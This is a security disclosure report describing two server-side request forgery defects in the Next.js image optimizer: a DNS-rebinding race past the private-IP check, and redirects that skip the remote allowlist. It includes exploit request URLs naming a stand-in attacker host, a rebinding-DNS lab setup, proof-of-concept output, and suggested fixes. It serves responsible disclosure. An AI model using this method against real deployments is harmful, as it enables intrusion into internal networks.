# Next.js image optimizer: the SSRF guard is a TOCTOU check, and redirect targets skip the remote allowlist

**Target:** `next@16.3.4` (latest stable at time of testing)
**Component:** `packages/next/src/server/image-optimizer.ts`, `fetchExternalImage()`
**Class:** CWE-918 (SSRF), via CWE-367 (TOCTOU) and CWE-863 (incomplete authorization on redirect)
**Status:** both defects reproduced by execution against a running `next start` server.

## Summary

`/_next/image` fetches remote images on behalf of the client. Two independent
defects in that fetch path combine into unauthenticated SSRF into the server's
internal network.

**Defect 1 — the private-IP guard is TOCTOU.** `fetchExternalImage()` resolves
the hostname with `dns.lookup()` and rejects private addresses, then calls
`fetch()`, **which resolves the same hostname again**. The two resolutions are
independent, so a hostname whose DNS answer changes between them passes the
check and is then fetched at a different address. Reproduced: the guard saw a
public address, and the request landed on `127.0.0.1`.

**Defect 2 — redirect targets are not re-checked against the allowlist.**
`hasRemoteMatch()` is called exactly once, at line 442, against the *original*
URL. `fetchExternalImage()` follows upstream redirects (line 915-916) and
re-applies only the private-IP guard — never the allowlist. Reproduced: with
`remotePatterns` allowing only `allowed.test`, a 302 from that host caused
Next.js to fetch `notallowed.test`.

Defect 2 removes Defect 1's precondition. On its own, Defect 1 requires the
attacker's hostname to be in `images.remotePatterns`. With Defect 2, any
allowlisted host that has an open redirect — a common property of CDNs and
image hosts — lets the attacker steer the fetch to a hostname they control, and
from there Defect 1 reaches internal addresses.

## Severity

I am claiming **High for the composed chain, Medium for either defect alone**,
and I would rather the program correct me upward than have overstated it.

`CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:L/SI:L/SA:N`

Reasoning, stated plainly:
* The request is **delivered** to the internal address — confirmed. That is the
  core of the finding.
* It is **largely blind**. The response body is only returned to the attacker if
  it passes `detectContentType()` as an image, or is a `BYPASS_TYPES` member.
  An internal JSON/HTML endpoint yields a `400` instead of its contents. Status
  code and timing remain a reliable oracle for internal service and port
  enumeration, and GET-triggered state changes on internal services are
  reachable.
* `AT:P` because a permissive `remotePatterns`, or an allowlisted host with an
  open redirect, is required.

For calibration: CVE-2026-64645, the `rewrites()` SSRF, was rated High. That one
proxies the upstream **response body** back to the attacker, so it is strictly
worse than this. I am not claiming parity on impact — only on reachability.

## Affected

Confirmed by execution on **16.3.4**. The code shape is long-standing; I have
not run other versions and make no claim about them.

## Root cause

### Defect 1 — `dns.lookup()` and `fetch()` resolve independently

`packages/next/src/server/image-optimizer.ts:856-890`:

```ts
export async function fetchExternalImage(
  href: string,
  dangerouslyAllowLocalIP: boolean,
  maximumResponseBody: number,
  count = 3
): Promise<ImageUpstream> {
  if (!dangerouslyAllowLocalIP) {
    const { hostname } = new URL(href)
    let ips = [hostname]
    if (!isIP(hostname)) {
      const records = await lookup(hostname, {   // <-- resolution #1: the check
        family: 0,
        all: true,
        hints: ALL,
      }).catch((_) => [{ address: hostname }])
      ips = records.map((record) => record.address)
    }
    const privateIps = ips.filter((ip) => isPrivateIp(ip))
    if (privateIps.length > 0) {
      // ... throw new ImageError(400, '"url" parameter is not allowed')
    }
  }
  const res = await fetch(href, {                 // <-- resolution #2: the use
    signal: AbortSignal.timeout(7_000),
    redirect: 'manual',
  })
```

The guard validates *addresses*; the fetch is then performed by *name*. Nothing
carries the validated address forward, so the check constrains resolution #1
only.

`isPrivateIp()` itself is sound and is not the problem — it uses `ipaddr.js`
`range() !== 'unicast'`, normalises IPv4-mapped IPv6 and strips IPv6 brackets
(`packages/next/src/server/is-private-ip.ts:3-20`). I attacked it directly
before concluding the bug was elsewhere.

### Defect 2 — the allowlist is consulted once, the fetch loop many times

`hasRemoteMatch` appears exactly twice in the file: the import at line 13 and a
single call at line 442, inside URL-parameter validation, against the original
`hrefParsed`. The redirect loop at lines 913-921:

```ts
    const redirect = new URL(locationHeader, href).href
    return fetchExternalImage(
      redirect,
      dangerouslyAllowLocalIP,
      maximumResponseBody,
      count - 1
    )
```

re-enters `fetchExternalImage`, which re-applies the private-IP guard but has no
access to `domains`/`remotePatterns` and therefore cannot re-check them.

## Reproduction

Both scripts are self-contained and run entirely against loopback. Lab: a
stock `next@16.3.4` app, `next build && next start` on :3000, a rebinding DNS
responder on 127.0.0.1:53, and a stand-in internal service on 127.0.0.1:80.

### Defect 1 — `poc/poc_image_rebind.sh`

`next.config.js` allowlists the attacker hostname, isolating the IP guard:

```js
images: { remotePatterns: [{ protocol: 'http', hostname: 'rebind.attacker.test' }] }
```

The DNS responder answers the first `A` query for that name with a public
address and every later one with `127.0.0.1`. Literal output
(`poc/poc_image_rebind.txt`):

```
=== 1. the guard, in isolation: the name currently resolves public ===
   getaddrinfo #1 -> 93.184.216.34

=== 2. attacker request to the image optimizer ===
    GET /_next/image?url=http://rebind.attacker.test/x.png&w=640&q=75
    http status = 400

=== 3. DNS answers actually served, in order ===
     -- counter reset (new run) --
     A query #1 -> 93.184.216.34
     A query #2 -> 127.0.0.1
    (#1 is the guard's dns.lookup(); #2 is fetch()'s own resolution)

=== 4. did the request reach the internal service on 127.0.0.1:80? ===
   INTERNAL SERVICE HIT: /x.png host=rebind.attacker.test
    -> SSRF DELIVERED despite the private-IP guard

=== 5. what Next.js logged ===
   ⨯ The requested resource isn't a valid image for http://rebind.attacker.test/x.png received null
```

Note section 5: Next.js never logged `hostname resolved to private IP`. The
guard did not fire — it passed on the public answer — and the only complaint is
that the internal service's reply was not a valid image. The `400` returned to
the attacker is the *post-fetch* content-type rejection, not a block.

### Defect 2 — `poc/poc_image_redirect.sh`

`images.dangerouslyAllowLocalIP = true` disables **only** the private-IP guard
and leaves `hasRemoteMatch()` fully in force, so a hit on the non-allowlisted
host can only mean the allowlist was not consulted:

```js
images: {
  remotePatterns: [{ protocol: 'http', hostname: 'allowed.test' }],
  dangerouslyAllowLocalIP: true,
}
```

Literal output (`poc/poc_image_redirect.txt`):

```
=== 1. sanity: the allowlisted host issues an open redirect ===
   302 -> http://notallowed.test/y.png

=== 2. attacker request, naming ONLY the allowlisted host ===
   GET /_next/image?url=http://allowed.test/x.png&w=640&q=75
   http status = 400

=== 3. which upstream hosts the server actually contacted ===
   ALLOWED HOST hit /x.png -> 302 http://notallowed.test/y.png
   ALLOWED HOST hit /x.png -> 302 http://notallowed.test/y.png
   NOT-ALLOWLISTED HOST REACHED: /y.png host=notallowed.test
   -> notallowed.test is NOT in remotePatterns, yet it was fetched.
      The redirect target is not re-validated against the allowlist.
```

## Honest limits

* **The two defects were demonstrated separately, not as one end-to-end run.**
  Each link is individually reproduced above; the composition follows from them
  but I did not execute it as a single chain. The obstacle is a lab artifact,
  not a logical gap: modelling the "legitimate allowlisted CDN" requires a host
  that passes the private-IP guard, and every address I can bind in this
  container is loopback. I would rather say this than imply a run I did not do.
* **Blind.** See the severity section. I did not find a way to return an
  internal response body to the attacker, and I am not claiming one.
* **GET only**, with no attacker-controlled request headers or body.
* Defect 1 needs the attacker to control DNS for a hostname and to win a race
  that is wide (two independent resolutions, no caching in between) but not
  guaranteed on every attempt.
* Defect 2's real-world reach depends entirely on the app's `remotePatterns`.
  An app with a tight allowlist of hosts that have no open redirect is not
  meaningfully exposed by Defect 2 alone.
* `dangerouslyAllowLocalIP: true` was used **only** to isolate Defect 2. Defect
  1 was reproduced with that flag at its default (`false`).

## Suggested fix

1. **Pin the resolved address.** Resolve once, validate, then connect to the
   validated IP — e.g. pass a custom `lookup`/dispatcher to `fetch` that returns
   the already-checked address, or re-validate inside the connect hook. Checking
   a name and then fetching by name cannot be made safe.
2. **Re-check the allowlist on every hop.** Thread `domains`/`remotePatterns`
   into `fetchExternalImage` and call `hasRemoteMatch()` on each redirect target
   before following it. If following redirects off the allowlist is intended,
   that should be an explicit opt-in rather than the default.

Fixing (2) alone still leaves (1) exploitable for any app with a permissive
`remotePatterns`; fixing (1) alone still lets an allowlisted open redirect proxy
arbitrary public content through the app's origin. Both are worth doing.

## Secondary observation (reported for completeness, not claimed as a vulnerability)

`getSharp()` (`image-optimizer.ts:86-127`) does `require('sharp')` with **no
runtime version check**, and unconditionally unblocks `VipsForeignLoadHeif`.

In 16.3.3, commit `3a15b4ac6a` disabled AVIF input decoding — moving `AVIF` into
`BYPASS_TYPES` and removing `VipsForeignLoadHeif` from the unblock list. In
16.3.4, commit `12e173dd73` ("Re-enable AVIF image optimization and require
sharp 0.35.4") reverted both, and the compensating control is a single
`package.json` line: `optionalDependencies: { "sharp": "^0.35.4" }`.

That constrains only what npm installs *for Next.js*. A project that installs
`sharp` itself — which self-hosted deployments have long been told to do — has
its own copy hoisted, and `require('sharp')` resolves to it regardless of
version. Such an install silently returns to the exact configuration 16.3.3
mitigated, with attacker-supplied AVIF reaching libheif.

I am **not** claiming this as a vulnerability: it is a mitigation whose
precondition is declared but not enforced, and I did not attempt to exploit any
libheif issue. A version assertion in `getSharp()` — refusing to unblock
`VipsForeignLoadHeif` below the required sharp version — would make the
mitigation self-enforcing. Treat this as a hardening note.

## Prior art

I searched for existing reports of a TOCTOU/rebinding bypass of the image
optimizer's private-IP guard and of the redirect allowlist gap, and found none.
The nearby published work is CVE-2026-64645 (`rewrites()` destination hostname
SSRF), which is a different code path. If either defect duplicates something
non-public, I am happy to have it closed as such.

## AI tooling disclosure

I used an AI coding assistant throughout this audit — to read the tree, form the
hypotheses, and write the PoC harnesses and this report. No claim here rests on
model output: the DNS answer ordering, the internal-service hit, and the
non-allowlisted host contact were all observed in execution, and the scripts
that produce them are attached so they can be re-run.

## Environment

* `next@16.3.4`, React 19, App Router, `next build` + `next start`
* Node v22.22.2, Linux
* Source read at `vercel/next.js` tag `v16.3.4`
